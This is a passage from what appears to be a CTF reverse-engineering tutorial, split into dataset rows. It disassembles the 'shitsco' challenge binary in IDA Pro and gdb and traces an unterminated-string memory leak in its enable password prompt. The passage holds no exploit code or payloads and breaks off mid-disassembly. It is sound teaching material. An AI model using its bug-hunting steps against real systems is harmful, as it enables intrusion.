'Cybersecurity']",7
507,"followed by a command for more detailed information$ shellbash-3.2$Yeah, right.$The binary throws the shell prompt but after a few seconds it says Yeah, right. and returns to the regular prompt. So as expected we will need to work a little harder to get the shell. From my previous experience with Cisco equipment I know the enable command leads to administrator access. By default on some models the default password is blank, but that was not the case here. I was pretty sure it wasnt georgia, but trying it introduced me to what looks like our first bug.$ enable Please enter a password: georgia Nope. What we are seeing after our password attempt printed back at us appears to be leaked memory. Since C strings are NULL terminated, printf (the C function we will see used in this piece of code) will print each character of the designated string until it reaches a NULL byte. Thus if a string is not NULL terminated, printf will not know where the string ends and additional characters will be printed that are out of bounds of the string. While currently we just see garbage, perhaps we can take advantage of this to read interesting information from memory.","['Capture The Flag', 'Reverse Engineering', 'Penetration Testing', 'Infosec', 'Cybersecurity']",7
508,"For the reserve engineering portion I use IDA Pro. For an independent researcher new to reverse engineering, the price tag may seem a bit daunting. But I encourage you to take the plunge. You do not need to purchase the even more expensive Hex-Rays decompiler for this exercise. In fact, if you do have the decompiler, I encourage you not to look at the output until after you have completed reverse engineering and translating the output back into C code. Then it may be helpful for you to compare your results to the decompiler output if you do have it. If you are unfamiliar with IDA Pro Id suggest picking up a copy of Chris Eagles The IDA Pro Book and diving in with a problem like this one.","['Capture The Flag', 'Reverse Engineering', 'Penetration Testing', 'Infosec', 'Cybersecurity']",18
509,"You can make comments directly in the disassembly with the; key. You see some comments in my disassembly, but I actually prefer to go straight up old school and take notes with pen and paper. Whatever works best for you.text:080487E0; int __cdecl main(int, char **, char **).text:080487E0 main proc near; DATA XREF: start+17o.text:080487E0 push ebp.text:080487E1 mov ebp, esp.text:080487E3 push edi.text:080487E4 push esi.text:080487E5 push ebx.text:080487E6 and esp, 0FFFFFFF0h.text:080487E9 sub esp, 70h.text:080487EC mov eax, large gs:14h.text:080487F2 mov [esp+6Ch], eax.text:080487F6 xor eax, eax.text:080487F8 lea ebx, [esp+1Ch].text:080487FC mov ds:byte_804C380, 24h.text:08048803 mov ds:dword_804C3C0, 0.text:0804880D call sub_80489D0 Looking at the first few lines of the disassembly for main we see the typical stack frame setup followed by the stack cookie getting set . The stack cookie or canary is an anti-exploitation technique. A random value is put at the end of the stack frame before the saved return pointer. Before a function returns, the saved stack cookie is compared to the saved value in the data section. If the canary is incorrect its a sign that a buffer overflow attack has occurred and the program terminates before the function can return and EIP is potentially hijacked.","['Capture The Flag', 'Reverse Engineering', 'Penetration Testing', 'Infosec', 'Cybersecurity']",3
510,"A couple lines below the stack cookie setup we see a couple variables in the data segment being set . ds:byte_804C380 is set to 24h (36) and ds:dword_804C3C0 is 0. You can double click on those variables to be transported to their location in IDA view (and ESC to return whence you came). You can also press N to change the name of a variable. Once we figure out what variables seem to be for, what functions seem to do, etc. it will help us understand the program to change ds:dword_804C3C0 to something more human readable.","['Capture The Flag', 'Reverse Engineering', 'Penetration Testing', 'Infosec', 'Cybersecurity']",3
511,"At eax is set to 0. Then at we see another data segment address[eax] set to 0. Then we add 4 to eax and compare eax to 24h (32). You may not be familiar with the JB conditional jump . It is like JL except it is an unsigned comparison. If you are unfamiliar with unsigned vs. signed integers I recommend you read up on them as switching between the two is a common root cause for bugs. Anyway, if eax is less than 24h(32) we jump back to the label at . So now eax is 4 and we set ds:dword_804C3A0[4] to 0. So basically we are zeroing out 32 bytes of memory in the data segment 4 bytes at a time.","['Capture The Flag', 'Reverse Engineering', 'Penetration Testing', 'Infosec', 'Cybersecurity']",3
512,"After eax is equal to 24h(32) we exit the loop and continue on. Next we are moving some local variables to the top of stack. It may look a little weird but if you do the math, at the beginning of the function we see filename = dword ptr -1Ch and here we have [esp+1Ch+filename], offset filename. So we are moving the offset filename into esp and offset modes into esp+4. In x86 binaries, function arguments are stored on the stack. If youve worked primarily with x64 or ARM you are probably used to arguments being stored in the registers. So the filename (/home/shitsco/password) and the mode (r) are the arguments to the next function call fopen at .","['Capture The Flag', 'Reverse Engineering', 'Penetration Testing', 'Infosec', 'Cybersecurity']",3
513,"Fopen is a built in function in libc. You can read about it with man fopen on a Linux system or just Google it fopen. As expected from the arguments fopen takes a filename and an access mode. So the binary is opening /home/shitsco/password (the file we created during setup) for reading. The return value of a function is stored in eax. Right after the call to fopen we see test eax,eax. If eax is 0 the zero flag (ZF) will be set. Looking back at the man page for open we see it returns NULL (0) if there is an error. So we are making sure that fopen was able to open the file for reading. If eax is 0 we jump to . Then we use the perror built in function to write that we could not open the file and exit the program with status 1.","['Capture The Flag', 'Reverse Engineering', 'Penetration Testing', 'Infosec', 'Cybersecurity']",3
514,"Otherwise, if fopen returns a nonzero value we set up the arguments for fread on the stack. From freads man page fread we see it takes a pointer to read the data into (offset dword_804C3A0), number of blocks to read (1), number of bytes to read in a block (24h), and a file pointer to read from (ebx which is where we saved eax after fopen). So we will read 32 bytes from /home/shitsco/password into the data segment memory we zeroed out at the beginning of this subroutine. Clearly dword_804C3A0 is where the password is being stored. To make it easier on ourselves later, lets select dword_804C3A0 and press N to rename it to password. That way if we encounter it in another function we will know what it is.","['Capture The Flag', 'Reverse Engineering', 'Penetration Testing', 'Infosec', 'Cybersecurity']",3
515,"Right after fread returns we have another test eax,eax. Fread returns the number of bytes read. If 0 bytes were read we jump to and unwind the stack by adding 18h (24) to ESP and return to main. Otherwise we do an fclose on ebx(the FILE pointer to /home/shitsco/password) before the unwind and return. One thing I thought was interesting was according to this if the file can be opened but cannot be read, the program will continue with the password memory location set to all 0s. In a real CTF scenario we will not have access to the password file anyway, so lets move on towards the potential bug in the enable function.","['Capture The Flag', 'Reverse Engineering', 'Penetration Testing', 'Infosec', 'Cybersecurity']",3
516,"Back in main, though we just set up two arguments we do not immediately see a call to a function. The SBB instruction is integer subtraction with borrow. It adds the second operand and the carry flag (CF) and subtracts the result from the first operand. To find the value of CF we need to look a little deeper into how the CMP instruction works. CMP subtracts the second operand from the first and sets the EFLAGS register as the SUB instruction does. We know at this point ds:dword_804C3C0 is 0 so cmp ds:dword_804C3C0, 1 is really cmp 0,1 which is 01 = -1. This will set the carry flag. Thus the SSB instruction is really eax(eax+1) = -1. Next at we have not eax. -1 is 0FFFFFFFFh so a not makes eax 0 as all those true bits become false. Then we add 24h to eax and move it to esp+8 to join the other arguments we set up previously.","['Capture The Flag', 'Reverse Engineering', 'Penetration Testing', 'Infosec', 'Cybersecurity']",3
517,"If youve any experience with Linux command prompts in general you can probably guess that the alternative for the prompt is #, for a privileged shell. Just for the sake of argument lets follow the path that would print a # instead of a $. If ds:dword_804C3C0 is set to 1 then the CMP at becomes 11 = 0 and the carry flag is not set. Thus the SSB at is eax(eax + 0) = 0. The not eax at does a bitwise not on 0 which turns it into all 1s or FFFFFFFFh (-1). Thus the add eax, 24h sets eax to 23h which in the ascii table is #. So it stands to reason that ds:dword_804C3C0 is basically our is root?","['Capture The Flag', 'Reverse Engineering', 'Penetration Testing', 'Infosec', 'Cybersecurity']",3
518,"Then we jump down to 0804888F.text:0804888F loc_804888F:; CODE XREF: main+73j.text:0804888F mov eax, esi.text:08048891 mov edi, ebx.text:08048893 mov ecx, 14h.text:08048898 rep stosd.text:0804889A mov dword ptr [esp+0Ch], 0Ah.text:080488A2 mov dword ptr [esp+8], 50h.text:080488AA mov [esp+4], ebx.text:080488AE mov dword ptr [esp], 0.text:080488B5 call sub_8048C30The REP STOSD instruction stores the dword eax at edi, ecx times. Esi was xored with itself to make 0 a few lines before, and is now moved into eax. Ebx was set with lea ebx, [esp+1Ch] earlier in main. LEA short for load effective address will as the name implies load the address of esp+1ch into ebx. Recall the read_password subroutine used the ebx register to store the file pointer for /home/shitsco/password from fopen. However, at the beginning of the subroutine we saw push ebx and right before the return pop ebx, thus ebx is not changed. So we write a dword of 0 to esp+1ch 14h(20) times.","['Capture The Flag', 'Reverse Engineering', 'Penetration Testing', 'Infosec', 'Cybersecurity']",3
519,"Now we set up the arguments for the next subroutine call. Esp+4 is ebx which is still the address of our nulled out stack space. Esp+C is 0ah(newline).text:08048C30; =============== S U B R O U T I N E =======================================.text:08048C30.text:08048C30.text:08048C30 sub_8048C30 proc near; CODE XREF: main+D5p.text:08048C30;.text:08049318p.text:08048C30.text:08048C30 fd = dword ptr -3Ch.text:08048C30 buf = dword ptr -38h.text:08048C30 nbytes = dword ptr -34h.text:08048C30 var_1D = byte ptr -1Dh.text:08048C30 arg_0 = dword ptr 4.text:08048C30 arg_4 = dword ptr 8.text:08048C30 arg_8 = dword ptr 0Ch.text:08048C30 arg_C = byte ptr 10h.text:08048C30.text:08048C30 push ebp.text:08048C31 push edi.text:08048C32 push esi.text:08048C33 push ebx.text:08048C34 xor ebx, ebx.text:08048C36 sub esp, 2Ch.text:08048C39 mov ecx, [esp+3Ch+arg_8].text:08048C3D mov esi, [esp+3Ch+arg_0].text:08048C41 movzx ebp, [esp+3Ch+arg_C].text:08048C46 test ecx, ecx.text:08048C48 jle short loc_8048C88.text:08048C4A lea edi, [esp+3Ch+var_1D].text:08048C4E jmp short loc_8048C6B.text:08048C50;-.text:08048C50.text:08048C50 loc_8048C50: ; CODE XREF: sub_8048C30+51j.text:08048C50 movzx eax, [esp+3Ch+var_1D].text:08048C55 mov edx, ebp.text:08048C57 cmp al, dl.text:08048C59 jz short loc_8048C88.text:08048C5B mov edx, [esp+3Ch+arg_4].text:08048C5F mov [edx+ebx], al.text:08048C62 add ebx, 1.text:08048C65 cmp ebx, [esp+3Ch+arg_8].text:08048C69 jz short loc_8048C88.text:08048C6B.text:08048C6B loc_8048C6B: ; CODE XREF: sub_8048C30+1Ej.text:08048C6B mov [esp+3Ch+nbytes], 1; nbytes.text:08048C73 mov [esp+3Ch+buf], edi; buf.text:08048C77 mov [esp+3Ch+fd], esi; fd.text:08048C7A call _read.text:08048C7F test eax, eax.text:08048C81 jg short loc_8048C50.text:08048C83 mov ebx, 0FFFFFFFFh.text:08048C88.text:08048C88 loc_8048C88: ; CODE XREF: sub_8048C30+18j.text:08048C88; sub_8048C30+29j.text:08048C88 add esp, 2Ch.text:08048C8B mov eax, ebx.text:08048C8D pop ebx.text:08048C8E pop esi.text:08048C8F pop edi.text:08048C90 pop ebp.text:08048C91 retn.text:08048C91 sub_8048C30 endp After setting up the stack, we move some of the arguments into registers. Next we do a test ecx,ecx. Ecx is 50h from the arguments passed in, so it cannot be zero. Always consider though that subroutines may be called in multiple places in the binary with different arguments. You can press x in IDA to see cross references to any function. In this case if ecx was less than or equal to 0 we would just jump to loc_8048C88 to unwind the stack and return. Note at before returning we move ebx into eax. Recall eax is the return value of the function. In this case ebx was xored with itself early in the subroutine so the return value is 0.","['Capture The Flag', 'Reverse Engineering', 'Penetration Testing', 'Infosec', 'Cybersecurity']",3
520,"Returning to the main line where ecx is not 0, there is an unconditional jump to . Then we set up arguments for a call to the built in function read. Read takes a file descriptor to read from, a pointer to save the data into, and how many bytes to read. The file descriptor is esi which is arg0 which was passed in as 0 to the subroutine. 0 is the file descriptor for stdin. So the data will be read from the user at the terminal. The data is read to a local stack variable and 1 byte is read. Read returns the number of bytes read. Immediately after the call to read we do a test eax,eax on the return value. If the read was successful we jump to . Otherwise we set ebx to 0FFFFFFFFh(-1). This gets put into eax at and we unwind and return.","['Capture The Flag', 'Reverse Engineering', 'Penetration Testing', 'Infosec', 'Cybersecurity']",3
521,"After the jump we move the local variable we read into to eax and ebp into edx. Ebp is 0ah (newline) from the arguments. Cmp al,dl compares the lowest byte of eax and edx. If they are equal, the user pressed enter, so we jump to the unwind and return. If al and dl are not equal we move the remaining argument (the zeroed out local stack space in main) into edx. Then writes our byte from the user to the beginning of our stack space in main. Ebx was xored with itself at the beginning of the function. Then we add 1 to ebx and compare it to the third argument to the subroutine (50h). If they are equal we jump to and unwind and return. Otherwise we are back at to read another byte from the user.","['Capture The Flag', 'Reverse Engineering', 'Penetration Testing', 'Infosec', 'Cybersecurity']",3
522,"So this subroutine reads data one byte at a time from the user until a newline, or a maximum of 50h bytes. The data is stored in mains stack frame. It returns the number of bytes read. We can rename the function read_from_ __url__ read_from_user(int fd, char * buffer, int length, char stop){if (length <= 0){return 0;}char toread;int bytesread = 0;while (bytesread!= length){int fail = read(fd,&toread,1);if (fail == 0){return 0x FFFFFFFF;}if (toread == stop){return bytesread;}buffer[bytesread] = toread;bytesread++;}return bytesread;}Now lets return back to main with our number of bytes read.text:080488BA cmp eax, 0FFFFFFFFh.text:080488BD jz short loc_80488F8.text:080488BF mov [esp], ebx; s1.text:080488C2 call sub_8048A50.text:080488C7 test eax, eax.text:080488C9 jz short loc_8048858.text:080488CB cmp ds:dword_804C3C0, 1.text:080488D2 mov dword ptr [esp+4], 804960Bh.text:080488DA mov dword ptr [esp], 1.text:080488E1 sbb eax, eax.text:080488E3 not eax.text:080488E5 add eax, 24h.text:080488E8 mov [esp+8], eax.text:080488EC call ___printf_chk.text:080488F1 jmp short loc_8048882.text:080488F1;-.text:080488F3 align 8.text:080488F8.text:080488F8 loc_80488F8: ; CODE XREF: main+DDj.text:080488F8 mov edx, [esp+6Ch].text:080488FC xor edx, large gs:14h.text:08048903 jnz short loc_804890D.text:08048905 lea esp, [ebp-0Ch].text:08048908 pop ebx.text:08048909 pop esi.text:0804890A pop edi.text:0804890B pop ebp.text:0804890C retn.text:0804890D; Back in main we compare read_from_users return value to 0FFFFFFFFh (-1). If they are equal we jump to which checks the stack cookie (gs:14h) and returns. Assuming we were able to read from the user, we pass the pointer to the read data to another subroutine.","['Capture The Flag', 'Reverse Engineering', 'Penetration Testing', 'Infosec', 'Cybersecurity']",3
523,"This next subroutine is a bit longer than the last one. The beginning of the disassembly is shown below.text:08048A50; int __cdecl sub_8048A50(char *s1).text:08048A50 sub_8048A50 proc near; CODE XREF: main+E2p.text:08048A50.text:08048A50 s = dword ptr -3Ch.text:08048A50 s2 = dword ptr -38h.text:08048A50 n = dword ptr -34h.text:08048A50 var_28 = dword ptr -28h.text:08048A50 ptr = dword ptr -24h.text:08048A50 var_20 = dword ptr -20h.text:08048A50 s1 = dword ptr 4.text:08048A50.text:08048A50 push ebp.text:08048A51 push edi.text:08048A52 push esi.text:08048A53 push ebx.text:08048A54 sub esp, 2Ch.text:08048A57 mov ebx, s2.text:08048A5D mov [esp+3Ch+var_20], 0.text:08048A65 test ebx, ebx.text:08048A67 jz loc_8048BC0We see our usual function prologue, setting up the stack, etc. At we see a variable s2 being moved into ebx. If we double click on s2 it takes us to the data section. Just to start s2 looks like kind of a mess, but if we use the d key to adjust the data from bytes to double words we end up with something more readable. You can see the beginning of the converted data (along with some unconverted data) below.data:0804C260; char *s2.data:0804C260 s2 dd offset a Enable; DATA XREF: sub_8048A50+7r.data:0804C260; sub_8048A50+25o.data:0804C260; enable.data:0804C264 dd offset a Enables Adminis; Enables administrator access, with the .data:0804C268 dd 0.data:0804C26C dd 1.data:0804C270 dd offset sub_8049230.data:0804C274 dd 8049ABAh.data:0804C278 dd offset a Pings ATarget Ho; Pings a target host.data:0804C27C dd 0.data:0804C280 dd 1.data:0804C284 db 0E0h; a.data:0804C285 db 93h; .data:0804C286 db 4.data:0804C287 db 8.data:0804C288 db 0DBh; .data:0804C289 db 9Ah; .data:0804C28A db 4Basically what we have here is a data structure of commands this operating system knows starting with enable. The structure seems to be name of command, description of command, something, something, and a pointer to commands function. The somethings we should be able to fill in as we continue our reverse engineering. The C code I used to represent this structure is shown here.typedef struct _command {char * name;char * description;unsigned int admin;unsigned int args;void (commandfunc)(char *);} command;For now lets return to our sub_8048A50 and see how this data structure is used by the program.text:08048A6D mov [esp+3Ch+ptr], 0.text:08048A75 mov ebp, offset s2.text:08048A7A xor esi, esi.text:08048A7C lea esi, [esi+0].text:08048A80.text:08048A80 loc_8048A80:; CODE XREF: sub_8048A50+156j.text:08048A80 mov [esp+3Ch+s], ebx; s.text:08048A83 call _strlen.text:08048A88 mov edx, [esp+3Ch+s1].text:08048A8C mov [esp+3Ch+s2], ebx; s2.text:08048A90 mov [esp+3Ch+s], edx; s1.text:08048A93 mov [esp+3Ch+n], eax; n.text:08048A97 call _strncmp.text:08048A9C test eax, eax.text:08048A9E jnz loc_8048B9ETheres an instruction in the next bit that probably doesnt make much sense. In the previous instruction we xor esi with itself which will make esi 0. Then at we are loading the effective address of the contents to esi+0 into esi, which reads effectively as loading the address of 0+0 into 0, which is about as nonsensical a statement as I have ever read in disassembly. Its actually Google (and stackoverflow.com) to the rescue on this one. This instruction is actually a NOP or no operation. But its faster than a regular NOP instruction and is 4 bytes as opposed to a 1 byte NOP as explained at Stack Overflow.","['Capture The Flag', 'Reverse Engineering', 'Penetration Testing', 'Infosec', 'Cybersecurity']",3
524,"Next we see if strncmp return 0, meaning the two strings are equal (at least for the first n bytes). If the user did not enter enable we jump . For now since we are looking for a bug in the enable function, lets follow the path where strncmp returns 0 and the jnz is not taken.text:08048AA4 mov edx, [esp+3Ch+s1].text:08048AA8 test edx, edx.text:08048AAA cmovnz edi, [esp+3Ch+s1].text:08048AAF movzx eax, byte ptr [edi].text:08048AB2 cmp al, 20h.text:08048AB4 jnz short loc_8048AC2.text:08048AB6 xchg ax, ax.text:08048AB8We move the user data into edx and then test if it is zero. The instruction cmovnz only moves if the zero flag is set. The test instruction will set the zero flag if edx is 0. We know edx is enable since the strncmp returned 0 and we did not take the jnz above. But remember that this code may be used elsewhere in the program logic (for example in a loop) where edx may be zero. The movzx instruction takes the first byte in the contents of edi into eax and fills the rest of the register with zeros. So the lowest byte (al) of eax will be the first byte of the user input. Next we compare the byte to 20h which is a space. We know that the first byte of the user input was e to get here after the strncmp so the jnz at is taken.text:08048AC2 loc_8048AC2:; CODE XREF: sub_8048A50+64j.text:08048AC2 test al, al.text:08048AC4 jz short loc_8048AE8.text:08048AC6 lea eax, [edi+1].text:08048AC9 jmp short loc_8048AD2.text:08048AC9;-.text:08048ACB align 10h Having verified that the byte is not a space, now we check if it is null. Again, it is e so the jump is not taken at . Then we load the address of edi+1 into eax, effectively moving forward one byte in our user input. Then the non conditional jump is taken at .text:08048AD2 loc_8048AD2:; CODE XREF: sub_8048A50+79j.text:08048AD2 movzx edx, byte ptr [eax].text:08048AD5 test dl, dl.text:08048AD7 jz loc_8048C0F.text:08048ADD cmp dl, 20h.text:08048AE0 lea edi, [eax+1].text:08048AE3 jnz short loc_8048AD0.text:08048AE5 mov byte ptr [eax], 0Here he have another movzx. So we get the byte in eax (the second byte of our user provided string) and put it in edx with zeros. We test if it is null at . It is n the second letter of enable in this case, so the jump is not taken. Then we compare the byte to 20h (space). We move forward another byte before we make the jump since our byte is not a space at .text:08048AD0 loc_8048AD0:; CODE XREF: sub_8048A50+93j.text:08048AD0 mov eax, edi.text:08048AD2.text:08048AD2 loc_8048AD2:; CODE XREF: sub_8048A50+79j.text:08048AD2 movzx edx, byte ptr [eax].text:08048AD5 test dl, dl.text:08048AD7 jz loc_8048C0F.text:08048ADD cmp dl, 20h.text:08048AE0 lea edi, [eax+1].text:08048AE3 jnz short loc_8048AD0.text:08048AE5 mov byte ptr [eax], 0.text:08048AE8Basically weve just jumped one instruction above where we started at our last jump. We move our next byte (now the third byte) into eax. Then we loop through again and compare to null and space. There actually is an option in Cisco equipment (and here in Shitsco) to type enable <password> instead of just enable and then respond with the password later when prompted. But lets follow the path where the user just put in enable and we will loop through this piece of code until we reach the null at the end of the string. We will then make the jump at .text:08048C0F loc_8048C0F:; CODE XREF: sub_8048A50+87j.text:08048C0F mov edi, eax.text:08048C11 jmp loc_8048AE8This is a very simple block of code. We move eax (the address of the null at the end of our user string) into edi and then make an unconditional jump.text:08048AE8 loc_8048AE8:; CODE XREF: sub_8048A50+74j.text:08048AE8; sub_8048A50+1C1j.text:08048AE8 mov edx, [ebp+0Ch].text:08048AEB mov ebx, edi.text:08048AED lea eax, ds:4[edx*4].text:08048AF4 mov [esp+3Ch+var_28], edx.text:08048AF8 mov [esp+3Ch+s], eax; size.text:08048AFB call _malloc.text:08048B00 mov edx, [esp+3Ch+var_28].text:08048B04 cmp edx, esi.text:08048B06 mov [esp+3Ch+ptr], eax.text:08048B0A jle loc_8048C16.text:08048B10 mov edi, [esp+3Ch+ptr].text:08048B14 lea esi, [esi+0]Ebp is pointing at the beginning of our commands data structure (at enable). So ebp+0ch (12) is (looking at the data structure piece below) 1. Ebp, normally used as the frame pointer, is being used as a general purpose register here.data:0804C260; char *s2.data:0804C260 s2 dd offset a Enable; DATA XREF: sub_8048A50+7r.data:0804C260; sub_8048A50+25o.data:0804C260; enable.data:0804C264 dd offset a Enables Adminis; Enables administrator access, with the .data:0804C268 dd 0.data:0804C26C dd 1.data:0804C270 dd offset sub_8049230Heres another weird looking instruction at . Another option for when we are stumped is to go back to dynamic analysis with a debugger and actually see whats going on with the registers, etc. around the offending instruction.georgia@geode:~/shitsco$ gdb shitscopwndbg> break *0x08048AEDBreakpoint 1 at 0x8048aedpwndbg> run Starting program: Welcome to Shitsco Internet Operating System (IOS)For a command list, enter?$ enable Breakpoint 1, 0x08048aed in?? ()LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATAREGISTERS*EAX 0xffad45a2 0x0*EBX 0xffad45a2 0x0*ECX 0x65*EDX 0x1*EDI 0xffad45a2 0x0*ESI 0x0*EBP 0x804c260 0x8049abf outsb dx, byte ptr gs:[esi] /* enable */*ESP 0xffad4540 0xffad45a0 0x656c /* le */*EIP 0x8048aed lea eax, [edx*4 + 4]DISASM 0x8048aed lea eax, [edx*4 + 4]0x8048af4 mov dword ptr [esp + 0x14], edx0x8048af8 mov dword ptr [esp], eax0x8048afb call malloc@plt <0x80486f0>0x8048b00 mov edx, dword ptr [esp + 0x14]0x8048b04 cmp edx, esi0x8048b06 mov dword ptr [esp + 0x18], eax0x8048b0a jle 0x8048c160x8048b10 mov edi, dword ptr [esp + 0x18]0x8048b14 lea esi, [esi]0x8048b18 movzx edx, byte ptr [ebx]STACK00:0000 esp 0xffad4540 0xffad45a0 0x656c /* le */01:0004 0xffad4544 0x8049abf outsb dx, byte ptr gs:[esi] /* enable */02:0008 0xffad4548 0x603:000c 0xffad454c 0xf76e4740 (__printf_chk+128) mov edx, eax04:0010 0xffad4550 0xf7794ac0 (_IO_2_1_stdout_) 0xfbad2a8405:0014 0xffad4554 0xf7794000 (_GLOBAL_OFFSET_TABLE_) 0x1abda806:0018 0xffad4558 0x0 BACKTRACE] f 0 8048aedf 1 80488c7f 2 f7601af3 __libc_start_main+243Breakpoint *0x08048AEDpwndbg>Im using the pwndbg plugin for gdb to give me more detailed output about registers, the stack, etc. When I first started using it it took a little time to get used to, but now I cant imagine working in gdb without it. So I suggest you check it out. You can however use the usual gdb commands like info registers to view the registers and examine x for examine if you dont use pwndbg.","['Capture The Flag', 'Reverse Engineering', 'Penetration Testing', 'Infosec', 'Cybersecurity']",3
525,"Grab the memory address of the weird instruction at the left of your IDA Pro output and set a breakpoint in gdb as shown at . Now run the program and enter enable to follow our reverse engineering path. We break at the offending instruction and pwndbg automatically prints out all the info we need. In this case just looking at how the instruction is written in the code section clears things up for us. The discrepancy is due to GDB and IDA using different disassemblers. So we are loading the effective address of edx * 4 + 4 into eax, a much more sensible notion than that other thing with references to the data section and a 4 just hanging out. As we expected from our analysis edx is 1 , so we get 1 * 4 + 4 = 8 in eax.","['Capture The Flag', 'Reverse Engineering', 'Penetration Testing', 'Infosec', 'Cybersecurity']",3
526,"Coming back to our code (Ive copied the same code segment here, with the same previous wingdings, just because weve done so much in between), we are setting up for a call to the function malloc. Malloc takes one argument, the size, allocates a memory block of that size, and returns a pointer to the new memory block.text:08048AE8 loc_8048AE8:; CODE XREF: sub_8048A50+74j.text:08048AE8; sub_8048A50+1C1j.text:08048AE8 mov edx, [ebp+0Ch].text:08048AEB mov ebx, edi.text:08048AED lea eax, ds:4[edx*4].text:08048AF4 mov [esp+3Ch+var_28], edx.text:08048AF8 mov [esp+3Ch+s], eax; size.text:08048AFB call _malloc.text:08048B00 mov edx, [esp+3Ch+var_28].text:08048B04 cmp edx, esi.text:08048B06 mov [esp+3Ch+ptr], eax.text:08048B0A jle loc_8048C16.text:08048B10 mov edi, [esp+3Ch+ptr].text:08048B14 lea esi, [esi+0]One thing worth noting is that right below our weird instruction at we are saving edx onto the stack. And just after the call to malloc at we move the stack variable back into edx. At the beginning of each function we see a reference to cdecl. For example this function starts like this:; int __cdecl sub_8048A50(char *s1). Cdecl is a calling convention for C programs, and in cdecl the register edx is a volatile register. This means that its value can change in a function call such as malloc. So to prevent that stored value from being clobbered, we save it on the stack first. Malloc can then use edx and we still have access to our data and can restore it at . Conversely non-volatile registers will maintain their value across function calls. Different calling conventions have different volatile and non-volatile registers, and functions have to preserve the non-volatile ones so they are returned to the caller in the same state.","['Capture The Flag', 'Reverse Engineering', 'Penetration Testing', 'Infosec', 'Cybersecurity']",3
527,"After restoring edx we compare it to esi. We xored esi with itself near the very beginning of this subroutine, so it is 0 and edx is 1. The jle conditional jump is taken if edx is less than or equal to esi, which it is not. At there is another instance of that weird looking nop which we can ignore.text:08048B18 loc_8048B18:; CODE XREF: sub_8048A50+121j.text:08048B18 movzx edx, byte ptr [ebx].text:08048B1B mov eax, ebx.text:08048B1D cmp dl, 20h.text:08048B20 jnz short loc_8048B33In our next code section it looks like we go back to comparing bytes of user input to 20h (space). We saved edi into ebx in the previous code section, where edi was our index into the user input. We had stopped at the null byte at the end of the string enable. First we move that byte into edx with zero extension. We know it is not a space in this case so the jnz is taken.text:08048B33 loc_8048B33:; CODE XREF: sub_8048A50+D0j.text:08048B33 test dl, dl.text:08048B35 jz loc_8048BD0Landing from the jump we immediately test if the byte is null. In our case it is so the jz is taken as well.text:08048BD0 loc_8048BD0:; CODE XREF: sub_8048A50+E5j.text:08048BD0 mov edi, eax.text:08048BD2.text:08048BD2 loc_8048BD2:; CODE XREF: sub_8048A50+1D4j.text:08048BD2 mov edx, [esp+3Ch+ptr].text:08048BD6 lea eax, [edx+esi*4].text:08048BD9 mov dword ptr [eax], 0.text:08048BDF mov dword ptr [eax], 0.text:08048BE5 mov eax, ds:dword_804C3C0.text:08048BEA cmp [ebp+8], eax.text:08048BED jle short loc_8048B8C.text:08048BEF loc_8048BEF:; CODE XREF: sub_8048A50+13Aj.text:08048BEF mov [esp+3Ch+var_20], 0.text:08048BF7 mov eax, [esp+3Ch+var_20].text:08048BFB add esp, 2Ch.text:08048BFE pop ebx.text:08048BFF pop esi.text:08048C00 pop edi.text:08048C01 pop ebp.text:08048C02 retn When we land the first thing we do is save eax into edi. We moved ebx into eax in the previous code segment, so now edi is pointing at our null byte at the end of the user provided string enable. At we move the contents of esp+3Ch+ptr into edx. We saved the eax return value from malloc into this stack location previously, so this should be the pointer to our malloced 8 bytes. Then we move the address into eax (esi is still 0). We set the contents of our malloced memory to 0. Actually oddly we do it twice, but since we are not moving eax between them, this is functionally another nop.","['Capture The Flag', 'Reverse Engineering', 'Penetration Testing', 'Infosec', 'Cybersecurity']",3
528,"Then we move ds:dword_804C3C0 into eax. At the very beginning of main we had the instruction mov ds:dword_804C3C0, 0 and have not changed it since. Ebp is still set to our command data structures entry for the enable command, so ebp+8 is 0 as shown below at . 0 is in fact less than or equal to 0, so the jle is taken.data:0804C260; char *s2.data:0804C260 s2 dd offset a Enable; DATA XREF: sub_8048A50+7r.data:0804C260; sub_8048A50+25o.data:0804C260; enable.data:0804C264 dd offset a Enables Adminis; Enables administrator access, with the .data:0804C268 dd 0.data:0804C26C dd 1.data:0804C270 dd offset sub_8049230It is worth noting what happens if the jump is not taken. Variables are restored, the stack is unwound, and we return to main. It seems a reasonable assumption that ebp+0ch is the number of arguments and ebp+8 is whether this is a privileged command. If we do not have elevated privileges and attempt to execute a privileged command we return to main. Since enable is all about getting those elevated privileges, we are allowed to continue.text:08048B8C loc_8048B8C:; CODE XREF: sub_8048A50+19Dj.text:08048B8C mov eax, [esp+3Ch+ptr].text:08048B90 mov [esp+3Ch+s], eax.text:08048B93 call dword ptr [ebp+10h]After the jump we set up our argument for our next function call. We move our malloced memory (with null in it since we have no user provided arguments to pass) and then put it on the stack. The call to the contents of ebp+10h matches up with in our data structure above. This should take us to the function for enable. Since we only reverse engineered one specific path of this subroutine, we will save the C code for a later exercise.$ enable Please enter a password: georgia Nope. Finally we have reach our offending function. Recall that when we ran the program, when we entered the password georgia at the prompt in this function we saw some additional memory printed out. It appears to be garbage, but perhaps we can use it to our advantage.text:08049230 sub_8049230 proc near; DATA XREF:.data:0804C270o.text:08049230.text:08049230 dest = dword ptr -4Ch.text:08049230 src = dword ptr -48h.text:08049230 n = dword ptr -44h.text:08049230 var_40 = dword ptr -40h.text:08049230 s2 = byte ptr -34h.text:08049230 var_14 = dword ptr -14h.text:08049230 var_10 = dword ptr -10h.text:08049230 arg_0 = dword ptr 4.text:08049230.text:08049230 push esi.text:08049231 push ebx.text:08049232 sub esp, 44h.text:08049235 mov esi, [esp+4Ch+arg_0].text:08049239 mov eax, large gs:14h.text:0804923F mov [esp+4Ch+var_10], eax.text:08049243 xor eax, eax.text:08049245 mov eax, [esi].text:08049247 test eax, eax.text:08049249 jz loc_80492D8Remember that we sent in a null argument, as we will provide our password guess at the prompt. We move the pointer to the argument value into esi at . Then we move the contents of esi into eax at . Then we test if eax is null. Since in our case it is the jump if zero is taken.text:080492D8 loc_80492D8:; CODE XREF: sub_8049230+19j.text:080492D8 mov [esp+4Ch+src], offset a Please Enter APa; Please enter a password: .text:080492E0 lea ebx, [esp+4Ch+s2].text:080492E4 mov [esp+4Ch+dest], 1.text:080492EB call ___printf_chk.text:080492F0 mov eax, ds:stdout.text:080492F5 mov [esp+4Ch+dest], eax; stream.text:080492F8 call _fflush].text:080492FD mov [esp+4Ch+var_40], 0Ah.text:08049305 mov [esp+4Ch+n], 20h.text:0804930D mov [esp+4Ch+src], ebx.text:08049311 mov 